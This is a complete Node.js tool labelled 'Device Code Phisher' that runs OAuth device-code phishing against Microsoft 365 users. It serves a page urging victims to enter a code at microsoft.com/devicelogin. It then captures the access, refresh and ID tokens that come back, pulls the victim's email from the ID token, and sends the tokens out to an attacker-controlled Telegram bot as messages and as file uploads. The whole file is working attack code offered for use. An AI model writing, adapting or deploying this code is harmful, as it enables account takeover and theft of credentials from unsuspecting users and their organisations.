// ============================================================
// 🥔 DEVICE CODE PHISHER v1.0 – Standalone OAuth Device Flow
// ============================================================
// Captures Microsoft 365 tokens via device code grant.
// Exfiltrates to Telegram. No proxy, no extra fluff.
// ============================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const url = require('url');
const axios = require('axios');      // npm install axios
const FormData = require('form-data'); // npm install form-data
require('dotenv').config();          // npm install dotenv

// ── Environment ──
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c'; // public Microsoft client
const SCOPE = 'https://graph.microsoft.com/.default offline_access';

// ── Storage ──
const FLOWS_FILE = path.join(__dirname, 'device_flows.json');
let flows = [];
loadFlows();

function loadFlows() {
    try {
        if (fs.existsSync(FLOWS_FILE)) {
            flows = JSON.parse(fs.readFileSync(FLOWS_FILE, 'utf-8'));
        }
    } catch (e) { console.warn('Could not load flows:', e.message); }
}
function saveFlows() {
    fs.writeFileSync(FLOWS_FILE, JSON.stringify(flows, null, 2));
}

// ── Helpers ──
function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

// ── Telegram Exfil ──
async function sendToTelegram(data) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing – tokens printed to console only.');
        return;
    }
    try {
        const { email, tokens, sessionId } = data;
        let message = `🔐 **Device Code Capture!**\n\n`;
        message += `🆔 Session: ${sessionId}\n`;
        message += `👤 Email: ${email || 'Unknown'}\n`;
        message += `🕒 Time: ${new Date().toISOString()}\n\n`;
        if (tokens.access_token) message += `🔑 Access Token: ${tokens.access_token.slice(0, 30)}...\n`;
        if (tokens.refresh_token) message += `🔄 Refresh Token: ${tokens.refresh_token.slice(0, 30)}...\n`;
        if (tokens.id_token) message += `🆔 ID Token: ${tokens.id_token.slice(0, 30)}...\n`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 5000 });

        // Also send tokens as a file if available
        if (tokens.access_token || tokens.refresh_token || tokens.id_token) {
            const fileContent = `# Device Code Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
            let fileText = fileContent;
            if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
            if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
            if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
            const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
            fs.writeFileSync(tmpFile, fileText);
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                headers: form.getHeaders(),
                timeout: 10000
            });
            fs.unlinkSync(tmpFile);
        }
        console.log(`✅ Tokens sent to Telegram for session ${sessionId}`);
    } catch (e) {
        console.error('❌ Telegram send failed:', e.message);
    }
}

// ── HTTP Server ──
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;
    const method = req.method;

    // Health check
    if (pathname === '/' || pathname === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'healthy', timestamp: new Date().toISOString() }));
        return;
    }

    // Serve device page
    if (pathname === '/device' || pathname === '/device/') {
        const htmlPath = path.join(__dirname, 'public', 'device_code.html');
        if (fs.existsSync(htmlPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            fs.createReadStream(htmlPath).pipe(res);
        } else {
            // Fallback inline HTML
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
<!DOCTYPE html>
<html>
<head>
    <title>Device Code</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0a0e17; color: #e0e8f0; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: rgba(255,255,255,0.05); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 40px; text-align: center; max-width: 500px; }
        .code { font-size: 3rem; letter-spacing: 4px; background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin: 20px 0; font-weight: bold; }
        .instructions { color: #a0b0c0; margin-bottom: 20px; }
        .status { margin-top: 20px; font-size: 0.9rem; color: #80b0ff; }
        .loader { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Device Code</h1>
        <p class="instructions">Enter this code on <strong>microsoft.com/devicelogin</strong></p>
        <div id="codeDisplay" class="code">Loading...</div>
        <div id="status" class="status">⏳ Requesting device code...</div>
    </div>
    <script>
        (async function() {
            try {
                const resp = await fetch('/device/request', { method: 'POST' });
                const data = await resp.json();
                document.getElementById('codeDisplay').textContent = data.user_code;
                document.getElementById('status').innerHTML = '✅ Code ready – waiting for authentication... <span class="loader"></span>';

                // Poll for token
                const poll = async () => {
                    try {
                        const pollResp = await fetch('/device/token', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ device_code: data.device_code })
                        });
                        if (pollResp.status === 200) {
                            const tokenData = await pollResp.json();
                            document.getElementById('status').innerHTML = '✅ Authentication successful! Redirecting...';
                            setTimeout(() => {
                                window.location.href = 'https://login.microsoftonline.com';
                            }, 2000);
                        } else if (pollResp.status === 400) {
                            const err = await pollResp.json();
                            if (err.error === 'authorization_pending') {
                                setTimeout(poll, data.interval * 1000 || 5000);
                            } else if (err.error === 'expired_token') {
                                document.getElementById('status').innerHTML = '❌ Code expired. Please refresh the page.';
                            } else {
                                document.getElementById('status').innerHTML = '❌ Error: ' + (err.error_description || err.error);
                            }
                        } else {
                            document.getElementById('status').innerHTML = '❌ Server error.';
                        }
                    } catch (e) {
                        document.getElementById('status').innerHTML = '❌ Network error.';
                    }
                };
                setTimeout(poll, data.interval * 1000 || 5000);
            } catch (e) {
                document.getElementById('codeDisplay').textContent = 'Error';
                document.getElementById('status').innerHTML = '❌ Failed to get device code.';
            }
        })();
    </script>
</body>
</html>
            `);
        }
        return;
    }

    // ── API endpoints ──
    if (pathname === '/device/request' && method === 'POST') {
        (async () => {
            try {
                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
                    new URLSearchParams({
                        client_id: CLIENT_ID,
                        scope: SCOPE
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                const data = response.data;
                const flow = {
                    device_code: data.device_code,
                    user_code: data.user_code,
                    verification_uri: data.verification_uri,
                    expires_in: data.expires_in,
                    interval: data.interval,
                    status: 'pending',
                    created: new Date().toISOString(),
                    client_id: CLIENT_ID,
                    session_id: generateSessionId()
                };
                flows.push(flow);
                saveFlows();
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(data));
            } catch (error) {
                console.error('Device code request error:', error.response?.data || error.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
            }
        })();
        return;
    }

    if (pathname === '/device/token' && method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { device_code } = JSON.parse(body);
                if (!device_code) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
                    return;
                }
                const flow = flows.find(f => f.device_code === device_code);
                const clientId = flow?.client_id || CLIENT_ID;
                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                    new URLSearchParams({
                        client_id: clientId,
                        device_code: device_code,
                        grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                const tokens = response.data;
                let email = 'Unknown';
                if (tokens.id_token) {
                    try {
                        const parts = tokens.id_token.split('.');
                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                        email = payload.email || payload.preferred_username || payload.upn || email;
                    } catch (e) {}
                }
                if (flow) {
                    flow.status = 'approved';
                    flow.access_token = tokens.access_token;
                    flow.refresh_token = tokens.refresh_token;
                    flow.id_token = tokens.id_token;
                    flow.approved = new Date().toISOString();
                    flow.username = email;
                    saveFlows();
                }
                // Exfiltrate
                await sendToTelegram({
                    sessionId: flow?.session_id || 'unknown',
                    email: email,
                    tokens: {
                        access_token: tokens.access_token,
                        refresh_token: tokens.refresh_token,
                        id_token: tokens.id_token
                    }
                });
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(tokens));
            } catch (error) {
                if (error.response?.data?.error === 'authorization_pending') {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'authorization_pending' }));
                } else if (error.response?.data?.error === 'expired_token') {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'expired_token' }));
                } else {
                    console.error('Device token error:', error.response?.data || error.message);
                    res.writeHead(500, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
                }
            }
        });
        return;
    }

    // 404
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Device Code Phisher running on port ${PORT}`);
    console.log(`📱 Visit: http://localhost:${PORT}/device`);
    console.log(`📤 Telegram exfil: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED (set env vars)'}`);
});

process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
process.on('SIGINT', () => { server.close(() => process.exit(0)); });
